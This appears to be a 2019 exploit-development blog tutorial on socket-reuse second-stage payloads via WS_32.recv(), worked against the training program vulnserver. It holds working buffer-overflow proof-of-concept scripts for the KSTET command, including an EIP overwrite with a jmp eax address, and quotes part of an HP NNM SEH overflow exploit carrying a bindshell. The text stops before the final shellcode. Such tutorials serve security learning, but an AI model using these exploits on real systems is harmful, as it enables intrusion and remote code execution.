---
title:  "Exploit Development: Second Stage Payload - WS_32.recv() Socket Reuse"
date:   2019-05-13
tags: [posts]
excerpt: "Reusing an existing socket connection to add a buffer of a user defined length."
---
Introduction
---
While doing further research on ways to circumvent constraints on buffer space, I stumbled accross a neat way to append a second stage user supplied buffer of a given length to an exploit. Essentially, we will be utilizing the [winsock.h](https://docs.microsoft.com/en-us/windows/win32/api/winsock/) header from the [Win32 API](https://docs.microsoft.com/en-us/windows/desktop/apiindex/windows-api-list) to write a few pieces of shellcode, in order to get parameters for a function call onto the stack. Once these parameters are on the stack, we will call the [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) function from __WS_32.dll__. This will allow us to pass a second stage buffer, in order to execute a useful piece of shellcode, like a shell. Let's get into it.

Replicating the Function Call
---
As mentioned before, in order to execute a successful exploit, we must find out where the function call is happening within the [vulnerable piece of software](https://github.com/stephenbradshaw/vulnserver). This is no different than the process of exploiting a vulnerable parameter in an HTTP request. Let's take a closer look at this.

Here is a snippet of source code from [muts'](https://twitter.com/muts?lang=en) famous HP NNM Exploit:

```python
import socket
import os
import sys

print "[*] HP NNM 7.5.1 OVAS.exe SEH Overflow Exploit (0day)"
print "[*] http://www.offensive-security.com"

# --- #

buffer="GET http://" + evilcrash+ "/topology/homeBaseView HTTP/1.1\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+= bindshell 
```

If we take a look at the `buffer` parameter, we can clearly see that this is an HTTP request. The vulnerability seems to arise from the [Host](https://www.itprotoday.com/devops-and-software-development/what-host-header) header. So, in order for this exploit to be successful- one must successfully replicate a valid HTTP request. 

This is synonymous what the `recv()` function requires. We are tasked with successfully fulfilling valid parameters in order to call the function.

Let's take a look at the Microsoft documentation on this.

Looking at the function call, here are the parameters needed. Let's break this down:

```c++
int recv(
  SOCKET s,
  char   *buf,
  int    len,
  int    flags
);
```

The __first__ parameter, `SOCKET s`, is the file descriptor that references the socket connection. A file descriptor is a piece of data that the Operating System uses to reference a certain resource (file, socket connection, I/OP resource, etc.). Since we will be working within the x86 architecture, this will look something like this- `0x00000088` (this number will vary). 

Also, one thing to remember, is a file descriptor is utilized by the OS. The file descriptor is not actually a raw value of `0x00000088` (or whatever value the OS is using). The OS would not know what to do with a this value, as it is not a coherent memory address- just an arbitrary value. The OS utilized a memory address that points to the fild descriptor value (a pointer).

The __second__ parameter, `char *buf` is a pointer to the memory location the buffer is received at. Essentially, when developing our second stage payload, we will want to specify a memory location our execution will eventually reach.

The __third__ parameter, `int len` is the size of the buffer. Remember, this is going to be a hexademical representation of the decimal value we supply. A shell is around 350-3500 bytes. Let's remmeber this going forward.

The __fourth__ parameter, `int flags`, is a numerical value that will allow for adding semantics/options to the function. We will just have this parameter set to `0`, as to not influence or change the function in any unintended way.

Finding the Call to WS_32.recv()
---
As any network based buffer overflow works, we find a vulnerable parameter, command, or other field- and send data to that parameter. Here is the POC does just that:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
crash = "\x41" * 2000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

After executing the POC, here is what the debugger shows:

<img src="{{ site.url }}{{ site.baseurl }}/images/01.png" alt="">

After examining the crash, it seems as though EAX is going to be the best place for us to start building our shellcode.

Skipping some of the formalities, the POC has been updated to incorporate the proper offset to EIP and a `jmp eax` instruction:

```python
import os
import sys
import socket

# Vulnerable command
command = "KSTET "

# 2000 bytes to crash vulnserver.exe
crash = "\x41" * 70
crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
crash += "\x43" * (2000-len(crash))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.143", 9999))

s.send(command+crash)
```

Let' find the function call now. Close Immunity and vulnserver.exe. Restart vulnserver.exe and the reattach within Immunity.

__Right click__ on any disassembled instruction, and select __View > Module 'vulnserv'__ (the executable itself).

<img src="{{ site.url }}{{ site.baseurl }}/images/03.png" alt="">

Now that we are viewing the exedcutable itself, again, __right click__ on any disassembled instruction. Select __Search For > All intermodular calls__. This refers to all calls to the __.dll__ dependencies of the application. As the `recv()` function is apart of __WS_32.dll__, we will need to search for the intermodular calls.

Find the __WS_32.recv__ function in the __Destination__ column. (Pro tip: click on the __Destintation__ header to sort alphabetically):

<img src="{{ site.url }}{{ site.baseurl }}/images/04.png" alt="">
